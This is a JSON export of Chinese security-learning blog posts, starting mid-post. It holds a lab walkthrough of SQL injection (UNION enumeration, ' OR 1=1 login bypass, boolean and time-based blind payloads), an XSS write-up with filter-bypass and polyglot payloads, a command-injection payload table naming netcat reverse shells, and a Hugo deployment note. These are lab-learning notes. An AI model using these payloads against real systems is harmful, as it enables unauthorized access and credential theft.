语句告诉数据库我们希望更新表中的一行或多行数据。您使用 “update %tablename% SET” 指定要更新的表，然后选择要更新的一个或多个字段，以逗号分隔的列表，例如 “username=\u0026lsquo;root\u0026rsquo;，password=\u0026lsquo;pass123\u0026rsquo;”，最后，类似于 SELECT 语句，您可以使用 where 子句准确指定要更新的行，例如 “where username=\u0026lsquo;admin;“\nupdate users SET username='root',password='pass123' where username='admin';\nDELETE DELETE 语句告诉数据库我们希望删除一行或多行数据。除了缺少要返回的列之外，此查询的格式与 SELECT 非常相似。您可以使用 where 子句精确指定要删除的数据，并使用 LIMIT 子句指定要删除的行 数。\ndelete from users where username='martin';\ndelete from users;\n由于查询中未使用 WHERE 子句，因此所有数据都已从表中删除。\n基础做题 In-Band SQL Injection 查询库 利用union查询的原理，先确定回显的位置。\n构建 0 UNION SELECT 1,2,3\n可以看到页面情况，有三个回显位置\n构建 0 UNION SELECT 1,2,database()\n可以知道database的名字：sqli_one\n查询表 构建 0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'\n在此查询中，需要学习一些新内容。首先，方法 group_concat（） 从多个返回的行中获取指定的列（在我们的例子中为 table_name），并将其放入一个以逗号分隔的字符串中。接下来是 information_schema 数据库;数据库的每个用户都可以访问它，它包含有关该用户有权访问的所有数据库和表的信息。在这个特定的查询中，我们有兴趣列出 sqli_one 数据库中的所有 表，即 article 和 staff_users。\n由于第一级旨在发现 Martin 的密码，因此 staff_users 表是我们感兴趣的。我们可以再次利用 information_schema 数据库，通过以下查询找到此表的结构。\n0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'\n这与前面的 SQL 查询类似。但是，我们要检索的信息已从 table_name 更改为 column_name，我们在 information_schema 数据库中查询的表已从 tables 更改为 columns，并且我们正在搜索 table_name 列值为 staff_users 的任何行\n查询结果为 staff_users 表提供三列：id、password 和 username。我们可以使用以下查询的 username 和 password 列来检索用户的信息。\n0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '\u0026lt;br\u0026gt;') FROM staff_users\n同样，我们使用 group_concat 方法将所有行返回到一个字符串中，使其 更易于阅读。我们还添加了 ，\u0026rsquo;：\u0026rsquo;， 以将用户名和密码彼此分开。我们没有用逗号分隔，而是选择了 HTML \u0026lt;br\u0026gt; 标签，该标签强制每个结果位于单独的行上，以便于阅读。\n身份认证绕过盲注 与带内 SQL 注入不同，我们可以直接在屏幕上看到攻击的结果，而盲 SQLi 是指我们几乎没有收到反馈来确认我们注入的查询是否真的成功，这是因为错误消息已被禁用，但无论如何注入仍然有效。您可能会感到惊讶，我们只需要一点点反馈即可成功枚举整个数据库。\n最直接的盲 SQL 注入技术之一是绕过身份验证方法，例如登录表单。在这种情况下，我们对从数据库中检索数据并不那么感兴趣;我们只想通过登录。\n连接到用户数据库的登录表单的开发方式通常使 Web 应用程序对用户名和密码的内容不感兴趣，而更关心两者是否在 users 表中形成匹配的对。简单来说，Web 应用程序会询问数据库，“您有用户名为 bob 的用户，密码为 bob123 吗？ 数据库回答 Yes 或 No （true/false），并且根据该答案，指示 Web 应用程序是否允许您继续。\n考虑到上述信息，没有必要枚举有效的用户名/密码对。我们只需要创建一个以 yes/true 回复的数据库查询。\n实际： SQL 注入示例的第二级显示了这个确切的示例。我们可以在标有 “SQL Query” 的框中看到，对数据库的查询如下：\nselect * from users where username='%username%' and password='%password%' LIMIT 1;\n注意：%username% 和 %password% 值取自登录表单字段。SQL Query （SQL 查询） 框中的初始值将为空，因为这些字段当前为空。\n要将其转换为始终返回 true 的查询，我们可以在 password 字段中输入以下内容：\n' OR 1=1;--\n这会将 SQL 查询转换为以下内容：\nselect * from users where username='' and password='' OR 1=1;\n因为 1=1 是 true 语句，并且我们使用了 OR 运算符，所以这将始终导致查询返回 true，这满足 Web 应用程序逻辑，即数据库找到了有效的用户名/密码组合，并且应该允许访问。\n基于布尔盲注 基于布尔值的 SQL 注入是指我们从注入尝试中收到的响应，可以是 true/false、yes/no、on/off、1/0 或任何只能有两个结果的响应。该结果确认了我们的 SQL Injection payload 成功或失败。在第一次检查时，您可能会觉得这种有限的回答无法提供太多信息。不过，仅通过这两个响应，就可以枚举整个数据库结构和内容。\n实际： 览器正文包含 {“taken”：true}。此 API 端点复制了许多订阅表单上的常见功能，该功能检查用户名是否已注册，以提示用户选择不同的用户名。 由于 taken 的值设置为 true，因此我们可以假设用户名 admin 已注册。我们可以通过将模拟浏览器地址栏中的用户名从 admin 更改为 admin123 来确认这一点，按下 Enter 键后，你会看到所采用的值 现在已更改为 false\nselect * from users where username = '%username%' LIMIT 1;\n我们唯一可以控制的输入是查询字符串中的用户名，我们必须使用它来执行 SQL 注入。将用户名保持为 admin123，我们可以开始附加到此内容以尝试使数据库确认 true 内容，将 taken 字段的状态从 false 更改为 true。\n与前面的级别一样，我们的第一个任务是建立 users\u0026rsquo; 表中的列数，这可以通过使用 UNION 语句来实现。将 username 值更改为以下内容：\nadmin123' UNION SELECT 1;-- 由于 Web 应用程序已使用取为 false 的值 进行响应，因此我们可以确认这是不正确的列值。 继续添加更多列，直到我们得到 true 的 taken 值 。您可以通过将 username 设置为以下值来确认答案为三列：\nadmin123' UNION SELECT 1,2,3;-- 在我们已经确定了列数，我们可以进行数据库的枚举。我们的第一个任务是发现数据库名称。我们可以通过使用内置的 database（） 方法，然后使用 like 运算符来尝试查找将返回 true 状态的结果。\n尝试以下 username 值，看看会发生什么：\nadmin123' UNION SELECT 1,2,3 where database() like '%';--\n我们得到一个 true 响应，因为在 like 运算符中，我们只有 % 的值 ，它将匹配任何内容，因为它是通配符值。如果我们将通配符运算符更改为 **a%，**您将看到响应返回 false，这确认数据库名称不以字母 a 开头。我们可以循环遍历所有字母、数字和字符，例如 - 和 _，直到找到匹配项。如果您将以下内容作为 username 值发送，您将收到一个 true 响应，确认数据库名称以字母 s 开头\nadmin123' UNION SELECT 1,2,3 where database() like 's%';--\n现在，您继续 数据库名称的下一个字符，直到找到另一个真实的响应，例如，\u0026lsquo;sa%\u0026rsquo;、\u0026lsquo;sb%\u0026rsquo;、\u0026lsquo;sc%\u0026rsquo; 等。继续此过程，直到发现数据库名称的所有字符，即 sqli_three\n我们已经建立了数据库名称，现在我们可以通过使用 information_schema 数据库使用类似的方法使用它来枚举表名。尝试将 username 设置为以下值：\nadmin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--\n此查询在 tables 表中的 information_schema 数据库中 查找数据库名称与 sqli_three 匹配 且表名称以字母 a 开头的结果。 由于上述查询导致 false 响应，我们可以确认 sqli_three 数据库中没有以字母 a 开头的表。和以前一样，您需要在字母、数字和字符之间循环，直到找到正匹配项。\n您最终会在 sqli_three 数据库中发现一个名为 users 的表，您可以通过运行以下 username payload 来确认该表：\nadmin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name='users';--\n最后，我们现在需要枚举 users 表中的列名 ，以便我们可以正确地搜索登录凭据。 同样，我们可以使用 information_schema 数据库和我们已经获得的信息来查询它的列名。使用下面的有效负载，我们搜索 columns 表，其中 database 等于 sqli_three，表名称为 users，列名称以字母 a 开头。\nadmin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';\n同样， 您需要在字母、数字和字符之间循环，直到找到匹配项。由于您要查找多个结果，因此每次找到新的列名称时，都必须将其添加到有效负载中，以避免发现相同的结果。例如，找到名为 id 的列后，将其附加到原始有效负载中（如下所示）。\nadmin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';\n重复此过程 3 次，您将发现列的 ID、用户名和密码。现在，您可以使用它来查询 users 表以获取登录凭据。首先，您需要找到一个有效的用户名，您可以使用下面的有效负载：\nadmin123' UNION SELECT 1,2,3 from users where username like 'a%\nadmin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%\n基于时间的盲注 基于时间的盲目 SQL 注入与上述基于 布尔值的盲注非常相似，因为发送的请求相同，但这次没有明显的查询是错还是对的指示。相反，正确查询的指标基于查询完成所需的时间。此时间延迟是使用内置方法（如 SLEEP（x） 和 UNION 语句引入的。SLEEP（） 方法只会在成功的 UNION SELECT 语句后执行。\n实际： 因此，例如，在尝试建立表中的列数时，您将使用以下查询：\nadmin123' UNION SELECT SLEEP(5);--\n如果响应时间没有暂停，则我们知道查询不成功，因此与之前的任务一样，我们添加另一列：\nadmin123' UNION SELECT SLEEP(5),2;--\n有效负载应产生 5 秒的延迟，确认 UNION 语句成功执行，并且有两列。\n按照布尔盲注的步骤，只是更改一下前面的语句，要改成sleep()形式\n最后得到admin：4961\n","date":"2025-03-18T00:00:00Z","image":"https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/73aeab67fb4786d5331bab4f3b2452827dba9d186069cdc60db0ecfab89b34c5.png","permalink":"https://Yerucrem.github.io/p/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/","title":"SQL注入基础"},{"content":"XSS THM 做题记录 Level One: 看到一个表单，要您输入的姓名，输入姓名后，该表单将在下面的一行中显示，例如：\n如果查看 Page Source，将看到姓名反映在代码中：\n我们将尝试输入以下 JavaScript Payload，而不是输入姓名： \u0026lt;script\u0026gt;alert('THM');\u0026lt;/script\u0026gt;\n现在，当单击输入按钮时，将收到一个带有字符串 THM 的警报弹出窗口，页面源代码将如下所示：\nLevel Two： 与上一个级别一样，系统将再次要求您输入的姓名。这一次，当单击 enter 时，姓名将反映在 input 标签中：\n查看页面源，可以看到姓名反映在 input 标签的 value 属性中：\n如果要尝试前面的 JavaScript 有效负载，它将不起作用，因为无法从 input 标签内部运行它。相反，我们需要先转义 input 标签，以便 payload 可以正常运行。可以使用以下有效负载执行此作：\n\u0026quot;\u0026gt;\u0026lt;script\u0026gt;alert('THM');\u0026lt;/script\u0026gt;\n有效负载的重要部分是“\u0026gt;”，它关闭 value 参数，然后关闭 input 标记。\n现在，这会正确关闭 input 标记并允许 JavaScript 有效负载运行：\nLevel Three: 看到另一个表单，询问名字，与上一级一样，名字会反映在 HTML 标签中，这次是 textarea 标签。\n我们必须使用以下有效负载，以略微不同的方式转义 textarea 标签和输入 1（在 Level Two 中）：\n\u0026lt;/textarea\u0026gt;\u0026lt;script\u0026gt;alert('THM');\u0026lt;/script\u0026gt;\n上述有效负载的重要部分是 \u0026lt;/textarea\u0026gt;，它会导致 textarea 元素关闭，以便脚本运行。\nLevel Four: 在表单中输入姓名，会在页面上看到它。此级别看起来类似于 1 级，但在检查页面源代码时，会看到名字反映在一些 JavaScript 代码中。\n必须转义现有的 JavaScript 命令，以便能够运行代码;可以使用以下有效负载 ';alert（'THM'）;// 从下面的屏幕截图中可以看到，它将执行代码。' 关闭指定名称的字段，然后 ;表示当前命令的结束，末尾的 则``使它后面的任何内容成为注释，而不是可执行代码。\nLevel Five: 现在，此级别看起来与级别 1 相同，并且名字也会反映在同一个位置。但是，如果尝试有效负载 \u0026lt;script\u0026gt;alert('THM');\u0026lt;/script\u0026gt; ，它将不起作用。当查看页面源代码时，将了解原因。\nscript 会从有效负载中删除，这是因为有一个过滤器可以去除任何具有潜在危险的单词。\n当一个单词从字符串中删除时，你可以尝试一个有用的技巧。\n尝试输入有效负载 \u0026lt;sscriptcript\u0026gt;alert('THM');\u0026lt;/sscriptcript\u0026gt; 并单击输入按钮，将看到一个带有字符串 THM 的警报弹出窗口。\nLevel Six: 与第二级类似，我们必须从 input 标签的 value 属性中转义，我们可以尝试 \u0026quot;\u0026gt;\u0026lt;script\u0026gt;alert('THM');\u0026lt;/script\u0026gt; ，但这似乎不起作用。让我们检查一下页面源代码，看看为什么这不起作用。\n可以看到 \u0026lt; 和 \u0026gt; 字符从我们的 payload 中被过滤掉，从而阻止我们转义 IMG 标签。为了绕过过滤器，我们可以利用 IMG 标签的其他属性，比如 onload 事件。onload 事件将在 src 属性中指定的图像加载到网页后执行您选择的代码。\n让我们更改 payload 以反映这一点 /images/cat.jpg\u0026quot; onload=\u0026quot;alert('THM'); ，然后查看页面源，您将看到这将如何工作。\nPolyglots: XSS 多语言是一串文本，可以一站式转义属性、标签和绕过过滤器。可以在刚刚完成的所有 6 个级别上使用以下多语言，并且它会成功执行代码。\n1 jaVasCript:/*-/*`/*\\`/*\u0026#39;/*\u0026#34;/**/(/* */onerror=alert(\u0026#39;THM\u0026#39;) )//%0D%0A%0d%0a//\u0026lt;/stYle/\u0026lt;/titLe/\u0026lt;/teXtarEa/\u0026lt;/scRipt/--!\u0026gt;\\x3csVg/\u0026lt;sVg/oNloAd=alert(\u0026#39;THM\u0026#39;)//\u0026gt;\\x3e ","date":"2025-03-18T00:00:00Z","image":"https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/b700481cd7430f01667bb498798f40d218f0b35bb085b3ffa989e042ad5542a1.png","permalink":"https://Yerucrem.github.io/p/%E5%85%B3%E4%BA%8Exss%E5%9F%BA%E7%A1%80%E7%9A%84%E5%88%A9%E7%94%A8/","title":"关于XSS基础的利用"},{"content":"自动部署 参考 【Hugo】Hugo + Github 免费部署自己的博客\n首次部署 1 2 3 4 5 6 git init git add . git commit -m \u0026#34;first commit\u0026#34; git branch -M main git remote add origin {你的github仓库地址} git push -u origin main 更新 在dev目录下\n1 2 3 4 5 git init git add . git commit -m \u0026#34;update\u0026#34; git branch -M main git push ","date":"2025-03-18T00:00:00Z","image":"https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/d67014b38a1cd68b40e838a207152f5a77ecfc8a2e40c3d56b538fa48de38080.png","permalink":"https://Yerucrem.github.io/p/%E5%88%A9%E7%94%A8github%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E9%83%A8%E7%BD%B2/","title":"利用github实现自动部署"},{"content":"命令注入 分类 命令注入主要可以通过以下两种方式之一进行检测：\n盲命令注入 详细命令注入 方法 描述 盲 这种类型的注入是在测试有效负载时应用程序没有直接输出的地方。您必须调查应用程序的行为，以确定您的有效负载是否成功。 详细 这种类型的注入是测试有效负载后从应用程序获得直接反馈的地方。例如，运行 whoami 命令以查看应用程序在哪个用户下运行。Web 应用程序将直接在页面上输出用户名。 有用的有效载荷 Linux 有效载荷 描述 whoami 查看应用程序在哪个用户下运行。 ls 列出当前目录的内容。您也许能够找到配置文件、环境文件（令牌和应用程序密钥）等文件，以及更多有价值的内容。 ping 此命令将调用应用程序以挂起。这在测试应用程序是否进行盲命令注入时非常有用。 sleep 这是测试应用程序盲目命令注入时的另一个有用有效负载，其中计算机未安装 ping。 nc Netcat 可用于在易受攻击的应用程序上生成反向 shell。您可以使用此立足点在目标计算机上导航，以获取其他服务、文件或提升权限的潜在方法。 windows 有效载荷 描述 whoami 查看应用程序在哪个用户下运行。 dir 列出当前目录的内容。您也许能够找到配置文件、环境文件（令牌和应用程序密钥）等文件，以及更多有价值的内容。 ping 此命令将调用应用程序以挂起。这在测试应用程序是否进行盲命令注入时非常有用。 timeout 此命令还将调用应用程序以挂起。如果未安装 ping 命令，则它还可用于测试应用程序是否进行盲命令注入。 ","date":"2025-03-18T00:00:00Z","image":"https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/f11677927824a3d078e08a2c300d8ccf225d496d442a2b7c8be0ca2d5adf6d9a.png","permalink":"https://Yerucrem.github.io/p/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/","title":"命令注入基础"},{"content":"TEST ","date":"2024-03-19T00:00:00Z","image":"https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/01DFA140B78CF068F9CB2ACC01C76E40.jpg","permalink":"https://Yerucrem.github.io/p/%E6%B5%8B%E8%AF%95/","title":"测试"}]